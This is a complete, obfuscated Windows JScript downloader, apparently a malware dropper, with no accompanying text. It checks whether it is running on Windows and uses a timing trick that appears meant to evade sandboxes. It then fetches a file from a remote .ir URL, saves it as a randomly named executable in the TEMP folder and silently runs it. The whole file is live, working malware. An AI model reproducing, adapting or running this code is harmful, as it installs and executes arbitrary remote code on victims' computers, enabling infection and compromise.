var _UX = false;
var _FF = "CreateObject";
var _T = function _X() {return WScript[_FF]("WScript"+".Shell");}(), _Q = 11;
var _NK = "MSXML2.XMLHTTP";
var _PY = 2123213;
var _MW = 0;
function _PW(_Y){_T["Run"](_Y, _MW, _MW);};
function _JB(){return _NK + "";};
function _R(_I0, _QD){_MW = _MW * 1; return _I0 - _QD;};
function _CX(){return _FF;};
/*@cc_on
  @if (@_win32 || @_win64)
    _UX = true;
  @end
@*/
if (_UX)
{
var _D = "";
function _I(){return 22;};
var _A0 = 0; var _A = 0;
function _RA()
{
var _GP = new this["Date"]();
var _EP = _GP["getUTCMilliseconds"]();
WScript["Sleep"](_I());
var _GP = new this["Date"]();
var _SG = _GP["getUTCMilliseconds"]();
WScript["Sleep"](_I());
var _GP = new this["Date"]();
var _MO = _GP["getUTCMilliseconds"]();
var _A0 = "_U";
_A0 = _R(_SG, _EP);
var _A = "_B";
_A = _R(_MO, _SG);
_D = "open";
return _R(_A0, _A);
}
var _ZN = false;
var _G = false;
for (var _X0 = _MW; _X0 < _I() * 1; _X0++){if (_RA() != _MW){
_ZN = true; 
_A = "31" + 11 * _A0 + _A; 
_G = true; 
break;
}}
function _RS() {return ((_ZN == true) && (_ZN == _G)) ? 1 : _MW;};
if (_ZN && _RS() && _G){
function _PM() {return _T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "sZfZv79xmq2Ewf7I.ex" + "e";};
 _QS = _JB();
 _A1 = WScript[_FF](_QS);
 var _AM = 1;
 while (_AM){
try {
	if (_AM == 1)
	{
		_A1[_D]("GET", "http://topcarshop.ir/m1kas", false);
		_A1["send"]();
		_RW = "Sleep";
	}
	WScript[_RW](_I() + 120); 
	if (_A1["readystate"] < 2 * 2) continue;
	_AM = _MW;
	function _IC(_D0) {var _O = (1, 2, 3, 4, 5, _D0); return _O;};
	_O0 = WScript[_CX()]("ADODB.Stream");
	_QS = _O0;
	_QS[_D]();
	_QS["type"] = _IC(1);
	_QS["write"](_A1["ResponseBody"]);
	_O0["position"] = _IC(_MW);
	_QS["Save" + "ToFile"](_PM(), 2);
	_O0["cl"+"ose"]();
	_XC = _PM();
	_PW(_XC);
} catch(_D1){};
}
}
}

